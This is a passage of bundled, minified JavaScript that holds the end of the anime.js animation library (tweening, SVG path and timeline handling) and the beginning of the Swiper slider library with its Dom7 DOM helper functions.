            return t + t + n + n + i + i
        })), u = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(d), "rgba(" + parseInt(u[1], 16) + "," + parseInt(u[2], 16) + "," + parseInt(u[3], 16) + ",1)") : o.hsl(i) ? (d = /hsl\((\d+),\s*([\d.]+)%,\s*([\d.]+)%\)/g.exec(l = i) || /hsla\((\d+),\s*([\d.]+)%,\s*([\d.]+)%,\s*([\d.]+)\)/g.exec(l), u = parseInt(d[1], 10) / 360, i = parseInt(d[2], 10) / 100, l = parseInt(d[3], 10) / 100, d = d[4] || 1, 0 == i ? r = a = s = l : (r = n(i = 2 * l - (l = l < .5 ? l * (1 + i) : l + i - l * i), l, u + 1 / 3), a = n(i, l, u), s = n(i, l, u - 1 / 3)), "rgba(" + 255 * r + "," + 255 * a + "," + 255 * s + "," + d + ")") : void 0;

        function n(e, t, n) {
            return n < 0 && (n += 1), 1 < n && --n, n < 1 / 6 ? e + 6 * (t - e) * n : n < .5 ? t : n < 2 / 3 ? e + (t - e) * (2 / 3 - n) * 6 : e
        }

        var i, r, a, s, l, c, u, d = (d = k(e)) ? e.substr(0, e.length - d.length) : e;
        return t && !/\s/g.test(e) ? d + t : d
    }

    function _(e, t) {
        return Math.sqrt(Math.pow(t.x - e.x, 2) + Math.pow(t.y - e.y, 2))
    }

    function H(e) {
        for (var t, n = e.points, i = 0, r = 0; r < n.numberOfItems; r++) {
            var a = n.getItem(r);
            0 < r && (i += _(t, a)), t = a
        }
        return i
    }

    function z(e) {
        if (e.getTotalLength) return e.getTotalLength();
        switch (e.tagName.toLowerCase()) {
            case"circle":
                return 2 * Math.PI * M(e, "r");
            case"rect":
                return 2 * M(n = e, "width") + 2 * M(n, "height");
            case"line":
                return _({x: M(t = e, "x1"), y: M(t, "y1")}, {x: M(t, "x2"), y: M(t, "y2")});
            case"polyline":
                return H(e);
            case"polygon":
                return t = e.points, H(e) + _(t.getItem(t.numberOfItems - 1), t.getItem(0))
        }
        var t, n
    }

    function B(e, t) {
        var n = t || {}, i = n.el || function () {
            for (var t = e.parentNode; o.svg(t) && (t = t.parentNode, o.svg(t.parentNode));) ;
            return t
        }(), r = i.getBoundingClientRect(), a = M(i, "viewBox");
        t = r.width, r = r.height;
        return {
            el: i,
            viewBox: a = n.viewBox || (a ? a.split(" ") : [0, 0, t, r]),
            x: +a[0],
            y: +a[1],
            w: t / a[2],
            h: r / a[3]
        }
    }

    function F(e, t) {
        var n = /-?\d*\.?\d+/g, i = O(o.pth(e) ? e.totalLength : e, t) + "";
        return {
            original: i,
            numbers: i.match(n) ? i.match(n).map(Number) : [0],
            strings: o.str(e) || t ? i.split(n) : []
        }
    }

    function R(e) {
        return b(e ? x(o.arr(e) ? e.map(w) : w(e)) : [], (function (e, t, n) {
            return n.indexOf(e) === t
        }))
    }

    function j(e) {
        var t = R(e);
        return t.map((function (e, n) {
            return {target: e, id: n, total: t.length, transforms: {list: D(e)}}
        }))
    }

    function q(e, t) {
        var n, i = [], r = t.keyframes;
        for (n in t = r ? T(function (e) {
            for (var t = b(x(e.map((function (e) {
                return Object.keys(e)
            }))), (function (e) {
                return o.key(e)
            })).reduce((function (e, t) {
                return e.indexOf(t) < 0 && e.push(t), e
            }), []), n = {}, i = 0; i < t.length; i++) !function (i) {
                var r = t[i];
                n[r] = e.map((function (e) {
                    var t, n = {};
                    for (t in e) o.key(t) ? t == r && (n.value = e[t]) : n[t] = e[t];
                    return n
                }))
            }(i);
            return n
        }(r), t) : t) o.key(n) && i.push({
            name: n, tweens: function (e, t) {
                var n, i = E(t);
                /^spring/.test(i.easing) && (i.duration = c(i.easing)), o.arr(e) && (2 !== (n = e.length) || o.obj(e[0]) ? o.fnc(t.duration) || (i.duration = t.duration / n) : e = {value: e});
                var r = o.arr(e) ? e : [e];
                return r.map((function (e, n) {
                    return e = o.obj(e) && !o.pth(e) ? e : {value: e}, o.und(e.delay) && (e.delay = n ? 0 : t.delay), o.und(e.endDelay) && (e.endDelay = n === r.length - 1 ? t.endDelay : 0), e
                })).map((function (e) {
                    return T(e, i)
                }))
            }(t[n], e)
        });
        return i
    }

    var V = {
        css: function (e, t, n) {
            return e.style[t] = n
        }, attribute: function (e, t, n) {
            return e.setAttribute(t, n)
        }, object: function (e, t, n) {
            return e[t] = n
        }, transform: function (e, t, n, i, r) {
            var a;
            i.list.set(t, n), t !== i.last && !r || (a = "", i.list.forEach((function (e, t) {
                a += t + "(" + e + ") "
            })), e.style.transform = a)
        }
    };

    function G(e, t) {
        j(e).forEach((function (e) {
            for (var n in t) {
                var i = P(t[n], e), r = e.target, a = N(r, n, s = k(i), e), s = $(O(i, s || k(a)), a);
                a = A(r, n);
                V[a](r, n, s, e.transforms, !0)
            }
        }))
    }

    function X(e, t) {
        return b(x(e.map((function (e) {
            return t.map((function (t) {
                return function (e, t) {
                    var n, i, r, a = A(e.target, t.name);
                    if (a) {
                        var s = (i = e, (n = t).tweens.map((function (e) {
                            var t = function (e, t) {
                                    var n, i = {};
                                    for (n in e) {
                                        var r = P(e[n], t);
                                        o.arr(r) && 1 === (r = r.map((function (e) {
                                            return P(e, t)
                                        }))).length && (r = r[0]), i[n] = r
                                    }
                                    return i.duration = parseFloat(i.duration), i.delay = parseFloat(i.delay), i
                                }(e, i), a = t.value, s = o.arr(a) ? a[1] : a, l = k(s), c = N(i.target, n.name, l, i),
                                u = r ? r.to.original : c;
                            c = k(e = o.arr(a) ? a[0] : u) || k(c), c = l || c;
                            return o.und(s) && (s = u), t.from = F(e, c), t.to = F($(s, e), c), t.start = r ? r.end : 0, t.end = t.start + t.delay + t.duration + t.endDelay, t.easing = g(t.easing, t.duration), t.isPath = o.pth(a), t.isColor = o.col(t.from.original), t.isColor && (t.round = 1), r = t
                        }))), l = s[s.length - 1];
                        return {
                            type: a,
                            property: t.name,
                            animatable: e,
                            tweens: s,
                            duration: l.end,
                            delay: s[0].delay,
                            endDelay: l.endDelay
                        }
                    }
                }(e, t)
            }))
        }))), (function (e) {
            return !o.und(e)
        }))
    }

    function W(e, t) {
        function n(e) {
            return e.timelineOffset || 0
        }

        var i = e.length, r = {};
        return r.duration = i ? Math.max.apply(Math, e.map((function (e) {
            return n(e) + e.duration
        }))) : t.duration, r.delay = i ? Math.min.apply(Math, e.map((function (e) {
            return n(e) + e.delay
        }))) : t.delay, r.endDelay = i ? r.duration - Math.max.apply(Math, e.map((function (e) {
            return n(e) + e.duration - e.endDelay
        }))) : t.endDelay, r
    }

    var Y, U = 0, K = [], Q = [], J = Z;

    function Z() {
        Y = requestAnimationFrame(ee)
    }

    function ee(e) {
        var t = K.length;
        if (t) {
            for (var n = 0; n < t;) {
                var i, r = K[n];
                r.paused ? -1 < (i = K.indexOf(r)) && (K.splice(i, 1), t = K.length) : r.tick(e), n++
            }
            Z()
        } else Y = cancelAnimationFrame(Y)
    }

    function te(n) {
        var i, a = 0, s = 0, o = 0, l = 0, c = null;

        function u(e) {
            var t = window.Promise && new Promise((function (e) {
                return c = e
            }));
            return e.finished = t
        }

        var d, p, h, f,
            m = (d = C(e, p = n = void 0 === n ? {} : n), h = q(f = C(t, p), p), h = W(p = X(n = j(p.targets), h), f), f = U, U++, T(d, {
                id: f,
                children: [],
                animatables: n,
                animations: p,
                duration: h.duration,
                delay: h.delay,
                endDelay: h.endDelay
            }));

        function v() {
            var e = m.direction;
            "alternate" !== e && (m.direction = "normal" !== e ? "normal" : "reverse"), m.reversed = !m.reversed, i.forEach((function (e) {
                return e.reversed = m.reversed
            }))
        }

        function g(e) {
            return m.reversed ? m.duration - e : e
        }

        function y() {
            a = 0, s = g(m.currentTime) * (1 / te.speed)
        }

        function x(e, t) {
            t && t.seek(e - t.timelineOffset)
        }

        function w(e) {
            for (var t = 0, n = m.animations, i = n.length; t < i;) {
                var a = n[t], s = a.animatable, o = (c = a.tweens).length - 1, l = c[o];
                o && (l = b(c, (function (t) {
                    return e < t.end
                }))[0] || l);
                for (var c = r(e - l.start - l.delay, 0, l.duration) / l.duration, u = isNaN(c) ? 1 : l.easing(c), d = l.to.strings, p = l.round, h = [], f = l.to.numbers.length, v = void 0, g = 0; g < f; g++) {
                    var y = void 0, x = l.to.numbers[g], w = l.from.numbers[g] || 0;
                    y = l.isPath ? function (e, t) {
                        function n(n) {
                            return e.el.getPointAtLength(1 <= t + (n = void 0 === n ? 0 : n) ? t + n : 0)
                        }

                        var i = B(e.el, e.svg), r = n(), a = n(-1), s = n(1);
                        switch (e.property) {
                            case"x":
                                return (r.x - i.x) * i.w;
                            case"y":
                                return (r.y - i.y) * i.h;
                            case"angle":
                                return 180 * Math.atan2(s.y - a.y, s.x - a.x) / Math.PI
                        }
                    }(l.value, u * x) : w + u * (x - w);
                    p && (l.isColor && 2 < g || (y = Math.round(y * p) / p)), h.push(y)
                }
                var S = d.length;
                if (S) {
                    v = d[0];
                    for (var E = 0; E < S; E++) {
                        d[E];
                        var C = d[E + 1], T = h[E];
                        isNaN(T) || (v += C ? T + C : T + " ")
                    }
                } else v = h[0];
                V[a.type](s.target, a.property, v, s.transforms), a.currentValue = v, t++
            }
        }

        function S(e) {
            m[e] && !m.passThrough && m[e](m)
        }

        function E(e) {
            var t = m.duration, n = m.delay, d = t - m.endDelay, p = g(e);
            m.progress = r(p / t * 100, 0, 100), m.reversePlayback = p < m.currentTime, i && function (e) {
                if (m.reversePlayback) for (var t = l; t--;) x(e, i[t]); else for (var n = 0; n < l; n++) x(e, i[n])
            }(p), !m.began && 0 < m.currentTime && (m.began = !0, S("begin"), S("loopBegin")), p <= n && 0 !== m.currentTime && w(0), (d <= p && m.currentTime !== t || !t) && w(t), n < p && p < d ? (m.changeBegan || (m.changeBegan = !0, m.changeCompleted = !1, S("changeBegin")), S("change"), w(p)) : m.changeBegan && (m.changeCompleted = !0, m.changeBegan = !1, S("changeComplete")), m.currentTime = r(p, 0, t), m.began && S("update"), t <= e && (s = 0, m.remaining && !0 !== m.remaining && m.remaining--, m.remaining ? (a = o, S("loopComplete"), S("loopBegin"), "alternate" === m.direction && v()) : (m.paused = !0, m.completed || (m.completed = !0, S("loopComplete"), S("complete"), !m.passThrough && "Promise" in window && (c(), u(m)))))
        }

        return u(m), m.reset = function () {
            var e = m.direction;
            m.passThrough = !1, m.currentTime = 0, m.progress = 0, m.paused = !0, m.began = !1, m.changeBegan = !1, m.completed = !1, m.changeCompleted = !1, m.reversePlayback = !1, m.reversed = "reverse" === e, m.remaining = m.loop, i = m.children;
            for (var t = l = i.length; t--;) m.children[t].reset();
            (m.reversed && !0 !== m.loop || "alternate" === e && 1 === m.loop) && m.remaining++, w(0)
        }, m.set = function (e, t) {
            return G(e, t), m
        }, m.tick = function (e) {
            E(((o = e) + (s - (a = a || o))) * te.speed)
        }, m.seek = function (e) {
            E(g(e))
        }, m.pause = function () {
            m.paused = !0, y()
        }, m.play = function () {
            m.paused && (m.completed && m.reset(), m.paused = !1, K.push(m), y(), Y || J())
        }, m.reverse = function () {
            v(), y()
        }, m.restart = function () {
            m.reset(), m.play()
        }, m.reset(), m.autoplay && m.play(), m
    }

    function ne(e, t) {
        for (var n = t.length; n--;) S(e, t[n].animatable.target) && t.splice(n, 1)
    }

    return "undefined" != typeof document && document.addEventListener("visibilitychange", (function () {
        document.hidden ? (K.forEach((function (e) {
            return e.pause()
        })), Q = K.slice(0), K = []) : Q.forEach((function (e) {
            return e.play()
        }))
    })), te.version = "3.0.1", te.speed = 1, te.running = K, te.remove = function (e) {
        for (var t = R(e), n = K.length; n--;) {
            var i = K[n], r = i.animations, a = i.children;
            ne(t, r);
            for (var s = a.length; s--;) {
                var o = a[s], l = o.animations;
                ne(t, l), l.length || o.children.length || a.splice(s, 1)
            }
            r.length || a.length || i.pause()
        }
    }, te.get = N, te.set = G, te.convertPx = L, te.path = function (e, t) {
        var n = o.str(e) ? y(e)[0] : e, i = t || 100;
        return function (e) {
            return {property: e, el: n, svg: B(n), totalLength: z(n) * (i / 100)}
        }
    }, te.setDashoffset = function (e) {
        var t = z(e);
        return e.setAttribute("stroke-dasharray", t), t
    }, te.stagger = function (e, t) {
        var n = (t = void 0 === t ? {} : t).direction || "normal", i = t.easing ? g(t.easing) : null, r = t.grid,
            a = t.axis, s = t.from || 0, l = "first" === s, c = "center" === s, u = "last" === s, d = o.arr(e),
            p = d ? parseFloat(e[0]) : parseFloat(e), h = d ? parseFloat(e[1]) : 0, f = k(d ? e[1] : e) || 0,
            m = t.start || 0 + (d ? p : 0), v = [], y = 0;
        return function (e, t, o) {
            if (l && (s = 0), c && (s = (o - 1) / 2), u && (s = o - 1), !v.length) {
                for (var g, b, x, w = 0; w < o; w++) r ? (b = c ? (r[0] - 1) / 2 : s % r[0], x = c ? (r[1] - 1) / 2 : Math.floor(s / r[0]), g = b - w % r[0], b = x - Math.floor(w / r[0]), x = Math.sqrt(g * g + b * b), "x" === a && (x = -g), v.push(x = "y" === a ? -b : x)) : v.push(Math.abs(s - w)), y = Math.max.apply(Math, v);
                i && (v = v.map((function (e) {
                    return i(e / y) * y
                }))), "reverse" === n && (v = v.map((function (e) {
                    return a ? e < 0 ? -1 * e : -e : Math.abs(y - e)
                })))
            }
            return m + (d ? (h - p) / y : p) * (Math.round(100 * v[t]) / 100) + f
        }
    }, te.timeline = function (e) {
        var n = te(e = void 0 === e ? {} : e);
        return n.duration = 0, n.add = function (i, r) {
            var a = K.indexOf(n), s = n.children;

            function l(e) {
                e.passThrough = !0
            }

            -1 < a && K.splice(a, 1);
            for (var c = 0; c < s.length; c++) l(s[c]);
            return (a = T(i, C(t, e))).targets = a.targets || e.targets, i = n.duration, a.autoplay = !1, a.direction = n.direction, a.timelineOffset = o.und(r) ? i : $(r, i), l(n), n.seek(a.timelineOffset), l(a = te(a)), s.push(a), a = W(s, e), n.delay = a.delay, n.endDelay = a.endDelay, n.duration = a.duration, n.seek(0), n.reset(), n.autoplay && n.play(), n
        }, n
    }, te.easing = g, te.penner = h, te.random = function (e, t) {
        return Math.floor(Math.random() * (t - e + 1)) + e
    }, te
})), function (e, t) {
    "object" == typeof exports && "undefined" != typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : (e = e || self).Swiper = t()
}(this, (function () {
    "use strict";

    function e(e) {
        for (var t = 0; t < e.length; t += 1) this[t] = e[t];
        return this.length = e.length, this
    }

    var t = "undefined" == typeof document ? {
        body: {}, addEventListener: function () {
        }, removeEventListener: function () {
        }, activeElement: {
            blur: function () {
            }, nodeName: ""
        }, querySelector: function () {
            return null
        }, querySelectorAll: function () {
            return []
        }, getElementById: function () {
            return null
        }, createEvent: function () {
            return {
                initEvent: function () {
                }
            }
        }, createElement: function () {
            return {
                children: [], childNodes: [], style: {}, setAttribute: function () {
                }, getElementsByTagName: function () {
                    return []
                }
            }
        }, location: {hash: ""}
    } : document, n = "undefined" == typeof window ? {
        document: t,
        navigator: {userAgent: ""},
        location: {},
        history: {},
        CustomEvent: function () {
            return this
        },
        addEventListener: function () {
        },
        removeEventListener: function () {
        },
        getComputedStyle: function () {
            return {
                getPropertyValue: function () {
                    return ""
                }
            }
        },
        Image: function () {
        },
        Date: function () {
        },
        screen: {},
        setTimeout: function () {
        },
        clearTimeout: function () {
        }
    } : window;

    function i(i, r) {
        var a = [], s = 0;
        if (i && !r && i instanceof e) return i;
        if (i) if ("string" == typeof i) {
            var o, l, c = i.trim();
            if (0 <= c.indexOf("<") && 0 <= c.indexOf(">")) {
                var u = "div";
                for (0 === c.indexOf("<li") && (u = "ul"), 0 === c.indexOf("<tr") && (u = "tbody"), 0 !== c.indexOf("<td") && 0 !== c.indexOf("<th") || (u = "tr"), 0 === c.indexOf("<tbody") && (u = "table"), 0 === c.indexOf("<option") && (u = "select"), (l = t.createElement(u)).innerHTML = c, s = 0; s < l.childNodes.length; s += 1) a.push(l.childNodes[s])
            } else for (o = r || "#" !== i[0] || i.match(/[ .<>:~]/) ? (r || t).querySelectorAll(i.trim()) : [t.getElementById(i.trim().split("#")[1])], s = 0; s < o.length; s += 1) o[s] && a.push(o[s])
        } else if (i.nodeType || i === n || i === t) a.push(i); else if (0 < i.length && i[0].nodeType) for (s = 0; s < i.length; s += 1) a.push(i[s]);
        return new e(a)
    }

    function r(e) {
        for (var t = [], n = 0; n < e.length; n += 1) -1 === t.indexOf(e[n]) && t.push(e[n]);
        return t
    }

    i.fn = e.prototype, i.Class = e, i.Dom7 = e;
    var a = {
        addClass: function (e) {
            if (void 0 === e) return this;
            for (var t = e.split(" "), n = 0; n < t.length; n += 1) for (var i = 0; i < this.length; i += 1) void 0 !== this[i] && void 0 !== this[i].classList && this[i].classList.add(t[n]);
            return this
        }, removeClass: function (e) {
            for (var t = e.split(" "), n = 0; n < t.length; n += 1) for (var i = 0; i < this.length; i += 1) void 0 !== this[i] && void 0 !== this[i].classList && this[i].classList.remove(t[n]);
            return this
        }, hasClass: function (e) {
            return !!this[0] && this[0].classList.contains(e)
        }, toggleClass: function (e) {
            for (var t = e.split(" "), n = 0; n < t.length; n += 1) for (var i = 0; i < this.length; i += 1) void 0 !== this[i] && void 0 !== this[i].classList && this[i].classList.toggle(t[n]);
            return this
        }, attr: function (e, t) {
            var n = arguments;
            if (1 === arguments.length && "string" == typeof e) return this[0] ? this[0].getAttribute(e) : void 0;
            for (var i = 0; i < this.length; i += 1) if (2 === n.length) this[i].setAttribute(e, t); else for (var r in e) this[i][r] = e[r], this[i].setAttribute(r, e[r]);
            return this
        }, removeAttr: function (e) {
            for (var t = 0; t < this.length; t += 1) this[t].removeAttribute(e);
            return this
        }, data: function (e, t) {
            var n;
            if (void 0 !== t) {
                for (var i = 0; i < this.length; i += 1) (n = this[i]).dom7ElementDataStorage || (n.dom7ElementDataStorage = {}), n.dom7ElementDataStorage[e] = t;
                return this
            }
            if (n = this[0]) return n.dom7ElementDataStorage && e in n.dom7ElementDataStorage ? n.dom7ElementDataStorage[e] : n.getAttribute("data-" + e) || void 0
        }, transform: function (e) {
            for (var t = 0; t < this.length; t += 1) {
                var n = this[t].style;
                n.webkitTransform = e, n.transform = e
            }
            return this
        }, transition: function (e) {
            "string" != typeof e && (e += "ms");
            for (var t = 0; t < this.length; t += 1) {
                var n = this[t].style;
                n.webkitTransitionDuration = e, n.transitionDuration = e
            }
            return this
        }, on: function () {
            for (var e = [], t = arguments.length; t--;) e[t] = arguments[t];
            var n = e[0], r = e[1], a = e[2], s = e[3];

            function o(e) {
                var t = e.target;
                if (t) {
                    var n = e.target.dom7EventData || [];
                    if (n.indexOf(e) < 0 && n.unshift(e), i(t).is(r)) a.apply(t, n); else for (var s = i(t).parents(), o = 0; o < s.length; o += 1) i(s[o]).is(r) && a.apply(s[o], n)
                }
            }

            function l(e) {
                var t = e && e.target && e.target.dom7EventData || [];
                t.indexOf(e) < 0 && t.unshift(e), a.apply(this, t)
            }

            "function" == typeof e[1] && (n = e[0], a = e[1], s = e[2], r = void 0);
            s = s || !1;
            for (var c, u = n.split(" "), d = 0; d < this.length; d += 1) {
                var p = this[d];
                if (r) for (c = 0; c < u.length; c += 1) {
                    var h = u[c];
                    p.dom7LiveListeners || (p.dom7LiveListeners = {}), p.dom7LiveListeners[h] || (p.dom7LiveListeners[h] = []), p.dom7LiveListeners[h].push({
                        listener: a,
                        proxyListener: o
                    }), p.addEventListener(h, o, s)
                } else for (c = 0; c < u.length; c += 1) {
                    var f = u[c];
                    p.dom7Listeners || (p.dom7Listeners = {}), p.dom7Listeners[f] || (p.dom7Listeners[f] = []), p.dom7Listeners[f].push({
                        listener: a,
                        proxyListener: l
                    }), p.addEventListener(f, l, s)
                }
            }
            return this
        }, off: function () {
            for (var e = [], t = arguments.length; t--;) e[t] = arguments[t];
            var n = e[0], i = e[1], r = e[2], a = e[3];
            "function" == typeof e[1] && (n = e[0], r = e[1], a = e[2], i = void 0);
            a = a || !1;
            for (var s = n.split(" "), o = 0; o < s.length; o += 1) for (var l = s[o], c = 0; c < this.length; c += 1) {
                var u = this[c], d = void 0;
                if (!i && u.dom7Listeners ? d = u.dom7Listeners[l] : i && u.dom7LiveListeners && (d = u.dom7LiveListeners[l]), d && d.length) for (var p = d.length - 1; 0 <= p; --p) {
                    var h = d[p];
                    (r && h.listener === r || r && h.listener && h.listener.dom7proxy && h.listener.dom7proxy === r || !r) && (u.removeEventListener(l, h.proxyListener, a), d.splice(p, 1))
                }
            }
            return this
        }, trigger: function () {
            for (var e = [], i = arguments.length; i--;) e[i] = arguments[i];
            for (var r = e[0].split(" "), a = e[1], s = 0; s < r.length; s += 1) for (var o = r[s], l = 0; l < this.length; l += 1) {
                var c = this[l], u = void 0;
                try {
                    u = new n.CustomEvent(o, {detail: a, bubbles: !0, cancelable: !0})
                } catch (e) {
                    (u = t.createEvent("Event")).initEvent(o, !0, !0), u.detail = a
                }
                c.dom7EventData = e.filter((function (e, t) {
                    return 0 < t
                })), c.dispatchEvent(u), c.dom7EventData = [], delete c.dom7EventData
            }
            return this
        }, transitionEnd: function (e) {
            var t, n = ["webkitTransitionEnd", "transitionend"], i = this;

            function r(a) {
                if (a.target === this) for (e.call(this, a), t = 0; t < n.length; t += 1) i.off(n[t], r)
            }

            if (e) for (t = 0; t < n.length; t += 1) i.on(n[t], r);
            return this
        }, outerWidth: function (e) {
            return 0 < this.length ? e ? (e = this.styles(), this[0].offsetWidth + parseFloat(e.getPropertyValue("margin-right")) + parseFloat(e.getPropertyValue("margin-left"))) : this[0].offsetWidth : null
        }, outerHeight: function (e) {
            return 0 < this.length ? e ? (e = this.styles(), this[0].offsetHeight + parseFloat(e.getPropertyValue("margin-top")) + parseFloat(e.getPropertyValue("margin-bottom"))) : this[0].offsetHeight : null
        }, offset: function () {
            if (0 < this.length) {
                var e = (s = this[0]).getBoundingClientRect(), i = t.body, r = s.clientTop || i.clientTop || 0,
                    a = s.clientLeft || i.clientLeft || 0,
                    s = (i = s === n ? n.scrollY : s.scrollTop, s === n ? n.scrollX : s.scrollLeft);
                return {top: e.top + i - r, left: e.left + s - a}
            }
            return null
        }, css: function (e, t) {
            var i;
            if (1 === arguments.length) {
                if ("string" != typeof e) {
                    for (i = 0; i < this.length; i += 1) for (var r in e) this[i].style[r] = e[r];
                    return this
                }
                if (this[0]) return n.getComputedStyle(this[0], null).getPropertyValue(e)
            }
            if (2 !== arguments.length || "string" != typeof e) return this;
            for (i = 0; i < this.length; i += 1) this[i].style[e] = t;
            return this
        }, each: function (e) {
            if (!e) return this;
            for (var t = 0; t < this.length; t += 1) if (!1 === e.call(this[t], t, this[t])) return this;
            return this
        }, html: function (e) {
            if (void 0 === e) return this[0] ? this[0].innerHTML : void 0;
            for (var t = 0; t < this.length; t += 1) this[t].innerHTML = e;
            return this
        }, text: function (e) {
            if (void 0 === e) return this[0] ? this[0].textContent.trim() : null;
            for (var t = 0; t < this.length; t += 1) this[t].textContent = e;
            return this
        }, is: function (r) {
            var a, s, o = this[0];
            if (!o || void 0 === r) return !1;
            if ("string" == typeof r) {
                if (o.matches) return o.matches(r);
                if (o.webkitMatchesSelector) return o.webkitMatchesSelector(r);
                if (o.msMatchesSelector) return o.msMatchesSelector(r);
                for (a = i(r), s = 0; s < a.length; s += 1) if (a[s] === o) return !0;
                return !1
            }
            if (r === t) return o === t;
            if (r === n) return o === n;
            if (r.nodeType || r instanceof e) {
                for (a = r.nodeType ? [r] : r, s = 0; s < a.length; s += 1) if (a[s] === o) return !0;
                return !1
            }
            return !1
        }, index: function () {
            var e, t = this[0];
            if (t) {
                for (e = 0; null !== (t = t.previousSibling);) 1 === t.nodeType && (e += 1);
                return e
            }
        }, eq: function (t) {
            if (void 0 === t) return this;
            var n = this.length;
            return new e(n - 1 < t ? [] : t < 0 ? (n += t) < 0 ? [] : [this[n]] : [this[t]])
        }, append: function () {
            for (var n = [], i = arguments.length; i--;) n[i] = arguments[i];
            for (var r = 0; r < n.length; r += 1) for (var a = n[r], s = 0; s < this.length; s += 1) if ("string" == typeof a) {
                var o = t.createElement("div");
                for (o.innerHTML = a; o.firstChild;) this[s].appendChild(o.firstChild)
            } else if (a instanceof e) for (var l = 0; l < a.length; l += 1) this[s].appendChild(a[l]); else this[s].appendChild(a);
            return this
        }, prepend: function (n) {
            for (var i, r = 0; r < this.length; r += 1) if ("string" == typeof n) {
                var a = t.createElement("div");
                for (a.innerHTML = n, i = a.childNodes.length - 1; 0 <= i; --i) this[r].insertBefore(a.childNodes[i], this[r].childNodes[0])
            } else if (n instanceof e) for (i = 0; i < n.length; i += 1) this[r].insertBefore(n[i], this[r].childNodes[0]); else this[r].insertBefore(n, this[r].childNodes[0]);
            return this
        }, next: function (t) {
            return 0 < this.length ? t ? this[0].nextElementSibling && i(this[0].nextElementSibling).is(t) ? new e([this[0].nextElementSibling]) : new e([]) : this[0].nextElementSibling ? new e([this[0].nextElementSibling]) : new e([]) : new e([])
        }, nextAll: function (t) {
            var n = [], r = this[0];
            if (!r) return new e([]);
            for (; r.nextElementSibling;) {
                var a = r.nextElementSibling;
                t && !i(a).is(t) || n.push(a), r = a
            }
            return new e(n)
        }, prev: function (t) {
            if (0 < this.length) {
                var n = this[0];
                return t ? n.previousElementSibling && i(n.previousElementSibling).is(t) ? new e([n.previousElementSibling]) : new e([]) : n.previousElementSibling ? new e([n.previousElementSibling]) : new e([])
            }
            return new e([])
        }, prevAll: function (t) {
            var n = [], r = this[0];
            if (!r) return new e([]);
            for (; r.previousElementSibling;) {
                var a = r.previousElementSibling;
                t && !i(a).is(t) || n.push(a), r = a
            }
            return new e(n)
        }, parent: function (e) {
            for (var t = [], n = 0; n < this.length; n += 1) null === this[n].parentNode || e && !i(this[n].parentNode).is(e) || t.push(this[n].parentNode);
            return i(r(t))
        }, parents: function (e) {
            for (var t = [], n = 0; n < this.length; n += 1) for (var a = this[n].parentNode; a;) e && !i(a).is(e) || t.push(a), a = a.parentNode;
            return i(r(t))
        }, closest: function (t) {
            var n = this;
            return void 0 === t ? new e([]) : n = n.is(t) ? n : n.parents(t).eq(0)
        }, find: function (t) {
            for (var n = [], i = 0; i < this.length; i += 1) for (var r = this[i].querySelectorAll(t), a = 0; a < r.length; a += 1) n.push(r[a]);
            return new e(n)
        }, children: function (t) {
            for (var n = [], a = 0; a < this.length; a += 1) for (var s = this[a].childNodes, o = 0; o < s.length; o += 1) t ? 1 === s[o].nodeType && i(s[o]).is(t) && n.push(s[o]) : 1 === s[o].nodeType && n.push(s[o]);
            return new e(r(n))
        }, remove: function () {
            for (var e = 0; e < this.length; e += 1) this[e].parentNode && this[e].parentNode.removeChild(this[e]);
            return this
        }, add: function () {
            for (var e, t = [], n = arguments.length; n--;) t[n] = arguments[n];
            for (e = 0; e < t.length; e += 1) for (var r = i(t[e]), a = 0; a < r.length; a += 1) this[this.length] = r[a], this.length += 1;
            return this
        }, styles: function () {
            return this[0] ? n.getComputedStyle(this[0], null) : {}
        }
    };
    Object.keys(a).forEach((function (e) {
        i.fn[e] = a[e]
    }));
    var s, o = {
        deleteProps: function (e) {
            var t = e;
            Object.keys(t).forEach((function (e) {
                try {
                    t[e] = null
                } catch (e) {
                }
                try {
                    delete t[e]
                } catch (e) {
                }
            }))
        }, nextTick: function (e, t) {
            return void 0 === t && (t = 0), setTimeout(e, t)
        }, now: function () {
            return Date.now()
        }, getTranslate: function (e, t) {
            var i, r, a;
            return void 0 === t && (t = "x"), e = n.getComputedStyle(e, null), n.WebKitCSSMatrix ? (6 < (r = e.transform || e.webkitTransform).split(",").length && (r = r.split(", ").map((function (e) {
                return e.replace(",", ".")
            })).join(", ")), a = new n.WebKitCSSMatrix("none" === r ? "" : r)) : i = (a = e.MozTransform || e.OTransform || e.MsTransform || e.msTransform || e.transform || e.getPropertyValue("transform").replace("translate(", "matrix(1, 0, 0, 1,")).toString().split(","), "x" === t && (r = n.WebKitCSSMatrix ? a.m41 : 16 === i.length ? parseFloat(i[12]) : parseFloat(i[4])), (r = "y" === t ? n.WebKitCSSMatrix ? a.m42 : 16 === i.length ? parseFloat(i[13]) : parseFloat(i[5]) : r) || 0
        }, parseUrlQuery: function (e) {
            var t, i, r, a, s = {};
            if ("string" == typeof (e = e || n.location.href) && e.length) for (a = (i = (e = -1 < e.indexOf("?") ? e.replace(/\S*\?/, "") : "").split("&").filter((function (e) {
                return "" !== e
            }))).length, t = 0; t < a; t += 1) r = i[t].replace(/#\S+/g, "").split("="), s[decodeURIComponent(r[0])] = void 0 === r[1] ? void 0 : decodeURIComponent(r[1]) || "";
            return s
        }, isObject: function (e) {
            return "object" == typeof e && null !== e && e.constructor && e.constructor === Object
        }, extend: function () {
            for (var e = [], t = arguments.length; t--;) e[t] = arguments[t];
            for (var n = Object(e[0]), i = 1; i < e.length; i += 1) {
                var r = e[i];
                if (null != r) for (var a = Object.keys(Object(r)), s = 0, l = a.length; s < l; s += 1) {
                    var c = a[s], u = Object.getOwnPropertyDescriptor(r, c);
                    void 0 !== u && u.enumerable && (o.isObject(n[c]) && o.isObject(r[c]) ? o.extend(n[c], r[c]) : !o.isObject(n[c]) && o.isObject(r[c]) ? (n[c] = {}, o.extend(n[c], r[c])) : n[c] = r[c])
                }
            }
            return n
        }
    }, l = (s = t.createElement("div"), {
        touch: n.Modernizr && !0 === n.Modernizr.touch || !!(0 < n.navigator.maxTouchPoints || "ontouchstart" in n || n.DocumentTouch && t instanceof n.DocumentTouch),
        pointerEvents: !!(n.navigator.pointerEnabled || n.PointerEvent || "maxTouchPoints" in n.navigator && 0 < n.navigator.maxTouchPoints),
        prefixedPointerEvents: !!n.navigator.msPointerEnabled,
        transition: "transition" in (h = s.style) || "webkitTransition" in h || "MozTransition" in h,
